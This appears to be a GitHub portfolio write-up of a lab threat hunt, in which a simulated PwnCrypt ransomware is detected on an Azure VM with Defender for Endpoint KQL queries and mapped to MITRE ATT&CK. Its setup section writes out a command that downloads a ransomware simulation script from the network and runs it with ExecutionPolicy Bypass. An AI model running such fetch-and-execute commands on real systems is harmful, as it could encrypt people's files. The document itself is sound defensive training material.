<p align="center">
  <a href="https://github.com/Samuel-Cavada" target="_blank">
    <img src="https://img.shields.io/badge/Back_to_Main_Page-000000?style=for-the-badge&logo=github&logoColor=white" alt="Back to Main Page"/>
  </a>
</p>

<h1 align="center">Scenario 4: New Zero-Day Announced on News</h1>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Azure-0078D4?style=for-the-badge&logo=microsoftazure&logoColor=white" alt="Cloud Platform" />
  <img src="https://img.shields.io/badge/OS-Windows%2010-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="OS" />
  <img src="https://img.shields.io/badge/Tool-Microsoft%20Defender%20for%20Endpoint-00B388?style=for-the-badge&logo=microsoftdefender&logoColor=white" alt="Tool" />
  <img src="https://img.shields.io/badge/Tool-PowerShell-2C5EA8?style=for-the-badge&logo=powershell&logoColor=white" alt="Tool" />
  <img src="https://img.shields.io/badge/Focus-Ransomware%20Detection-orange?style=for-the-badge" alt="Focus Area" />
</p>

---

## 📌 Project Objective
> Detect and investigate the presence of a newly announced zero-day ransomware named PwnCrypt, which uses PowerShell to encrypt files with a unique `.pwncrypt` extension. This scenario tests the ability to respond to an emerging threat using real-time telemetry.

---

## 🧰 Tools & Technologies
- **Platform:** Azure VM
- **OS:** Windows 10
- **Tools:** Microsoft Defender for Endpoint, PowerShell
- **Languages/Scripts:** PowerShell, KQL

---

## 🧠 Skills Gained / Focus Areas
- Detected ransomware IOCs based on file naming conventions
- Correlated ransomware execution with script activity
- Investigated file and process logs across relevant telemetry tables
- Mapped findings to MITRE ATT&CK techniques such as T1486

---

## 🧪 Environment Setup
> VM was onboarded to Microsoft Defender for Endpoint. A PowerShell-based ransomware simulation script was executed:
```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1' -OutFile 'C:\programdata\pwncrypt.ps1'
cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
```

> Ransomware encrypts files in `C:\Users\Public\Desktop`, renaming them with a `.pwncrypt` extension prefix.

---

## 🛠️ Walkthrough
1. [Step 1: Preparation](#step-1-preparation)
2. [Step 2: Data Collection](#step-2-data-collection)
3. [Step 3: Data Analysis](#step-3-data-analysis)
4. [Step 4: Investigation](#step-4-investigation)
5. [Step 5: Response](#step-5-response)
6. [Step 6: Documentation](#step-6-documentation)
7. [Step 7: Improvement](#step-7-improvement)

---

### ✅ Step 1: Preparation
> Hypothesis: The PwnCrypt ransomware may have already affected devices in the network. Initial indicators include file extensions containing `.pwncrypt` and PowerShell-based encryption activity.

---

### ✅ Step 2: Data Collection
> Collected logs from:
- `DeviceFileEvents`
- `DeviceProcessEvents`

> Focused on device: `windows-target-1`

---

### ✅ Step 3: Data Analysis
> Identified ransomware behavior by filename:
```kql
let VMName = "windows-target-1";
DeviceFileEvents
| where DeviceName == VMName
| where FileName contains ".pwncrypt"
| order by Timestamp desc
```

> Correlated with process logs:
```kql
let specificTime = datetime(2024-10-16T05:24:46.8334943Z);
DeviceProcessEvents
| where DeviceName == "windows-target-1"
| where Timestamp between ((specificTime - 3m) .. (specificTime + 3m))
| order by Timestamp desc
```

---

### ✅ Step 4: Investigation
> Identified PowerShell script execution that launched ransomware logic  
> Process tree showed activity aligning with `pwncrypt.ps1`  
> IoCs confirmed ransomware was active on `windows-target-1`

> TTP match:  
- **T1486** – Data Encrypted for Impact  
- **T1059.001** – PowerShell

---

### ✅ Step 5: Response
> - Isolated infected device  
> - Collected and reviewed investigation package from MDE  
> - Recommended removal of `pwncrypt.ps1` and all encrypted files  
> - Notified SOC team and updated SIEM rules

---

### ✅ Step 6: Documentation
> - Identified ransomware by `.pwncrypt` IoC  
> - Traced execution to downloaded PowerShell payload  
> - Logged findings, exact timestamps, and event types for review  
> - Included relevant KQL queries in incident report

---

### ✅ Step 7: Improvement
> - Enforced application control to block unauthorized scripts  
> - Enabled ASR rules to restrict PowerShell access  
> - Recommended security awareness training for all staff  
> - Created automated detection query for `.pwncrypt`-style filenames

---

## 📝 Timeline Summary and Findings
- PowerShell script executed at: `2024-10-16T05:24:46Z`  
- Encrypted files appeared in Public Desktop with `.pwncrypt` extension  
- Ransomware activity confirmed via process and file telemetry  
- Incident contained and reported

---

## 📎 References
- [T1486 – Data Encrypted for Impact (MITRE)](https://attack.mitre.org/techniques/T1486/)
- [T1059.001 – PowerShell Execution (MITRE)](https://attack.mitre.org/techniques/T1059/001/)
- [Microsoft Defender Threat Hunting Guide](https://learn.microsoft.com/en-us/microsoft-365/security/defender/advanced-hunting-overview)
